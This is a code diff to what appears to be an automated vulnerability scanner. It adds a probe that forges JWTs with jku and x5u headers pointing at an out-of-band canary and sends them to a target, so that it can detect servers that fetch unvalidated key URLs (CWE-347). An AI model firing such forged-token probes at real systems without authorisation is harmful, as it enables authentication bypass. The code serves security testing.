@@ -24,7 +24,7 @@ from typing import List, Optional
 from core.swarm_engine import SwarmAgent
 from core.swarm_workers import register_worker
 
-from ._http import fetch, normalize_target_url
+from ._http import fetch, get_oob, normalize_target_url
 
 logger = logging.getLogger("viper.swarm_workers.vuln.jwt")
 
@@ -232,6 +232,51 @@ def _try_weak_keys(token: str) -> Optional[str]:
     return None
 
 
+async def _fire_jku_oob(url: str, header: dict, payload: dict, src: str,
+                        timeout: float) -> List[dict]:
+    """Fire an OUT-OF-BAND canary through the JWT ``jku`` / ``x5u`` header. Forge a token
+    whose jku (JWKS URL) and x5u (X.509 cert URL) headers point at our canary and send it to
+    the app. A verifier that FETCHES the jku to obtain the verification key WITHOUT
+    validating its host will call our listener back — proving an attacker can host their own
+    key and forge any token (CWE-347). Blind: emits a LEAD tagged with the canary token; the
+    gate confirms it only on a real callback. No OOB server configured -> no-op."""
+    oob = get_oob()
+    if oob is None:
+        return []
+    try:
+        canary = oob.new_canary("jwt:jku_inject")
+        cu = canary.http_url.rstrip("/")
+        h = dict(header)
+        h["alg"] = "HS256"
+        h["jku"] = cu + "/jwks.json"
+        h["x5u"] = cu + "/x5u.pem"
+        h_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
+        p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        forged = f"{h_b64}.{p_b64}.{_b64url_encode(b'viper-jku-probe')}"
+        headers = {"Authorization": f"Bearer {forged}"}
+        if src and src != "authorization":
+            headers["Cookie"] = f"{src}={forged}"
+        await fetch("GET", url, headers=headers, timeout=timeout)   # response irrelevant
+        return [{
+            "type": "jwt_jku_inject",
+            "vuln_type": "jwt:jku_inject",
+            "title": "JWT jku/x5u header injection candidate (out-of-band)",
+            "severity": "high",
+            "url": url,
+            "cwe": "CWE-347",
+            "oob_token": canary.token,
+            "confidence": 0.5,
+            "needs_oob_confirmation": True,
+            "evidence": (f"forged a token whose jku/x5u header points at OOB canary "
+                         f"{canary.token}; the gate confirms only if the server FETCHES it — "
+                         "an unvalidated JWKS/x5u URL means an attacker-controlled key and "
+                         "full token forgery (CWE-347)."),
+        }]
+    except Exception as exc:   # noqa: BLE001 — an OOB probe must never break the worker
+        logger.debug("jku oob fire failed: %s", exc)
+        return []
+
+
 async def run(agent: SwarmAgent) -> List[dict]:
     url = normalize_target_url(agent.target)
     if not url:
@@ -278,6 +323,7 @@ async def run(agent: SwarmAgent) -> List[dict]:
     _collect(resp.body[:32 * 1024], credential=False)
 
     findings: list[dict] = []
+    _jku_seed = None                 # first forgeable (header, payload, src) for the jku probe
     for tok, credential in candidates.items():
         parsed = _parse_jwt(tok)
         if not parsed:
@@ -292,6 +338,8 @@ async def run(agent: SwarmAgent) -> List[dict]:
         # records arrive via Set-Cookie too, but forging them grants nothing.
         # `forgeable` = real session credential we could escalate by forging.
         forgeable = credential and _authorizes_identity(payload, cookie_name)
+        if forgeable and _jku_seed is None:
+            _jku_seed = (dict(header), dict(payload), cookie_name or "authorization")
 
         # Detection 1: alg=none indicates obvious misuse (no real server
         # should sign with none, but the *header* with alg=none + empty
@@ -457,6 +505,12 @@ async def run(agent: SwarmAgent) -> List[dict]:
                     "jwt_probe_endpoint to confirm the forged token is accepted."
                 ),
             })
+
+    # Detection 5: jku / x5u header injection (out-of-band). Fire a canary through the
+    # jku/x5u headers of a forged token for a representative forgeable credential — a
+    # verifier that fetches an unvalidated JWKS URL calls our listener back.
+    if _jku_seed is not None:
+        findings.extend(await _fire_jku_oob(url, *_jku_seed, timeout))
 
     return findings
 
